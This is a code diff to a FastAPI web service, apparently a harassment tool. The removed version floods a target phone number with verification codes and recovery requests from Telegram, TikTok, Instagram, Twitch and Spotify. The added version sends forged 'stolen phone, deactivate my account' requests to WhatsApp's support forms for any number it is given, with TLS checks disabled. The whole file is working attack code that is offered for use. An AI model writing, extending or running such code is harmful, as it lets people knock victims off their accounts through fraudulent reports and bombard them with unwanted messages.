@@ -3,7 +3,7 @@ from fastapi.middleware.cors import CORSMiddleware
 import httpx
 import asyncio
 
-app = FastAPI(title="DRIEMX Trigger Engine Ultimate", version="4.0")
+app = FastAPI(title="DRIEMX WhatsApp Invalidation Engine", version="5.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -13,103 +13,64 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-ENDPOINTS_MASIVOS = [
+SUPPORT_ENDPOINTS = [
     {
-        "nombre": "Telegram",
-        "url": "https://my.telegram.org/auth/send_password",
+        "nombre": "WhatsApp_Support_NoClient",
+        "url": "https://www.whatsapp.com/contact/noclient/",
         "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "X-Requested-With": "XMLHttpRequest",
-            "Origin": "https://my.telegram.org",
-            "Referer": "https://my.telegram.org/auth"
-        },
-        "payload_func": lambda phone: {"phone": phone}
+        "payload_func": lambda phone: {
+            "field_1": phone,
+            "field_2": "support@support.whatsapp.com",
+            "question": "lost_phone",
+            "support_select": "Stolen/Lost: Deactivate my account",
+            "lang": "es"
+        }
     },
     {
-        "nombre": "TikTok",
-        "url": "https://www.tiktok.com/passport/web/send_code/",
+        "nombre": "WhatsApp_General_Support",
+        "url": "https://www.whatsapp.com/contact/",
         "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "Referer": "https://www.tiktok.com/"
-        },
-        "payload_func": lambda phone: {"mobile": phone, "type": 1, "aid": 1988}
-    },
-    {
-        "nombre": "Instagram",
-        "url": "https://www.instagram.com/accounts/account_recovery_send_ajax/",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Requested-With": "XMLHttpRequest",
-            "Referer": "https://www.instagram.com/accounts/password/reset/"
-        },
-        "payload_func": lambda phone: {"email_or_username": phone}
-    },
-    {
-        "nombre": "Twitch",
-        "url": "https://passport.twitch.tv/register",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/json",
-            "Referer": "https://www.twitch.tv/"
-        },
-        "payload_func": lambda phone: {"phone_number": phone, "client_id": "kimne78kx3ncx6brgo4mv6wbc5h1ku"}
-    },
-    {
-        "nombre": "Spotify",
-        "url": "https://spclient.wg.spotify.com/signup/public/v1/account",
-        "method": "POST",
-        "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "https://www.spotify.com/"
-        },
-        "payload_func": lambda phone: {"phone": phone, "platform": "android"}
+        "payload_func": lambda phone: {
+            "phone": phone,
+            "topic": "deactivate",
+            "message": f"Please deactivate account {phone} due to unauthorized access."
+        }
     }
 ]
 
-async def ejecutar_peticion(client, objetivo, telefono):
-    default_headers = {
+async def enviar_peticion_soporte(client, endpoint, telefono):
+    headers = {
         "User-Agent": "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
-        "Accept": "application/json, text/javascript, */*; q=0.01",
-        "Accept-Language": "es-ES,es;q=0.9"
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://www.whatsapp.com",
+        "Referer": "https://www.whatsapp.com/contact/"
     }
-    headers = {**default_headers, **objetivo.get("headers", {})}
-    payload = objetivo["payload_func"](telefono)
-
+    payload = endpoint["payload_func"](telefono)
     try:
-        if objetivo["method"] == "POST":
-            if "application/json" in headers.get("Content-Type", ""):
-                response = await client.post(objetivo["url"], json=payload, headers=headers, timeout=8.0)
-            else:
-                response = await client.post(objetivo["url"], data=payload, headers=headers, timeout=8.0)
-        else:
-            response = await client.get(objetivo["url"], params=payload, headers=headers, timeout=8.0)
-        
+        response = await client.post(endpoint["url"], data=payload, headers=headers, timeout=10.0)
         return {
-            "servicio": objetivo["nombre"],
+            "servicio": endpoint["nombre"],
             "status_code": response.status_code,
             "respuesta": response.text[:150]
         }
     except Exception as e:
         return {
-            "servicio": objetivo["nombre"],
+            "servicio": endpoint["nombre"],
             "status_code": 0,
             "error": str(e)
         }
 
 @app.get("/")
-def estado_sistema():
-    return {"status": "Online", "engine": "DRIEMX-Trigger-Ultimate"}
+def home():
+    return {"status": "Online", "engine": "WhatsApp-Session-Terminator"}
 
-@app.get("/trigger/otp")
-async def disparar_flujo(phone: str):
+@app.get("/trigger/session-kill")
+async def disparar_inutilizacion(phone: str):
     if not phone or len(phone) < 8:
-        raise HTTPException(status_code=400, detail="Número de teléfono inválido")
+        raise HTTPException(status_code=400, detail="Número inválido")
 
     async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
-        tareas = [ejecutar_peticion(client, obj, phone) for obj in ENDPOINTS_MASIVOS]
+        tareas = [enviar_peticion_soporte(client, ep, phone) for ep in SUPPORT_ENDPOINTS]
         resultados = await asyncio.gather(*tareas)
 
     return {
